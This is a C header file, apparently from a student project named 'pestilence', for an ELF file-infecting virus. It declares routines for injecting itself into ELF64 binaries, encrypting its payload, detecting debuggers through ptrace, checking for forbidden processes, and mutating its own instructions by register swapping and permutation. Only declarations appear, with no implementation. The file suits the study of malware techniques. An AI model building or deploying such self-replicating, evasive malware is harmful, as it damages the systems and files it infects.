/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: helmanso <helmanso@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/02/10 18:31:51 by helmanso          #+#    #+#             */
/*   Updated: 2021/06/05 18:12:38 by helmanso         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef pestilence_H
# define pestilence_H

# include <stdio.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/user.h>
# include <stdlib.h>
# include <string.h>
# include <sys/stat.h>
# include <sys/mman.h>
# include <sys/types.h>
# include <fcntl.h>
# include <dirent.h>
# include <elf.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#define MAX_FD 1024

# define SYS_READ       0
# define SYS_WRITE      1
# define SYS_OPEN       2
# define SYS_CLOSE      3
# define SYS_FSTAT      5
# define SYS_MMAP       9
# define SYS_MPROTEC    10
# define SYS_MUNMAP     11
# define SYS_EXIT	60
# define SYS_PTRACE     101
# define SYS_GETDENTS64 217
# define SYS_OPENAT     257
# define SYS_LSEEK		8
# define LAST anti_debugger
# define FIRST check_elf64

struct dirent64
{
	__ino64_t d_ino;
	__off64_t d_off;
	unsigned short int d_reclen;
	unsigned char d_type;
	char d_name[256];
};

typedef struct s_seed
{
	uint32_t x;
	uint32_t w;
	uint32_t y;
	uint32_t z;
}            t_seed;


typedef struct s_instructions {
	unsigned char flags;
	unsigned char rex;
	unsigned char op;
	unsigned char mod;
	unsigned char src;
	unsigned char dst;
	unsigned char imm[4];
	unsigned char dis[4];
	unsigned char sib;
}   t_instructions;


#define PUSH(x) (x >= 0x50 && x < 0x58)
#define POP(x) (x >= 0x58 && x <= 0x60)
#define MOV_IMM64(x) (x >= 0xB8 && x < 0XC0)
#define JE_FAMILY8(x) (x >= 0x70 && x <= 0x7F)
#define OP_IMM64 0x81
#define OP_IMM8 0x83
#define JMP8 0xeb
#define JMP64 0xe9
#define CALL 0xe8


void    exit_wrapper(int status);
void   write_wrapper(int fd, const void *buf, size_t size);
int	open_wrapper(const char *pathname, int flags, ...);
void	ft_putstr(char *c);
int		ft_strcmp(const char *s1, const char *s2);
void	ft_putchar(char c);
ssize_t read_wrapper(int fd, void *buf, size_t count);
int	getdents64_wrapper(unsigned int fd, struct dirent64 *dirp, unsigned int count);
char	*ft_strcpy(char *dst, const char *src);
char	*ft_strcat(char *dest, const char *src);
void    open_dir(char *path);
int		ft_strlen(const char *str);
void	*mmap_wrapper(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int     fstat_wrapper(int fd, struct stat *statbuf);
void    ft_putnbr(int n);
int             ft_memcmp(const void *s1, const void *s2, size_t n);
void    inject_self(void *mapped, int size, char *file, t_seed *seed);
int	    open_file(char *file, int *size, void **mapped);
void	*ft_memcpy(void *dest, const void *src, size_t count);
void    increase_phdr(void *mapped, int size, int vsize, Elf64_Addr **addr;);
int    _start(void);
int		lseek_wrapper(unsigned int fd, off_t offset, unsigned int whence);
int		forbidden_process(void);
void    free_it(char *full_path);
long	ptrace_wrapper(enum __ptrace_request request, pid_t pid, void *addr, void *data);
int    check_elf64(void *mapped, int size, char *file);
int anti_debugger(void);
void    end(void);
void    pestilence(void);
char* calc_addr(char* p_addr);
void	virus();
void	loader_vars();
void    encrypt(void *payload, int size, t_seed *seed);
void    decrypt(void *payload, int size, uint32_t key);
void	get_seed(void *payload, t_seed *seed);
void	ps_random(t_seed *seed);
int		op_c(void *mapped, int size, int fd, t_seed *seed);
void	register_swap(t_instructions instructions[256], int size, t_seed *seed);
int		mixed_opcode(unsigned char opcode);
void    instruction_permuation(t_instructions instructions[256], int code_size, t_seed *seed);
int		branching_opcode(unsigned char opcode);
void    do_nothing(int fd);
#endif
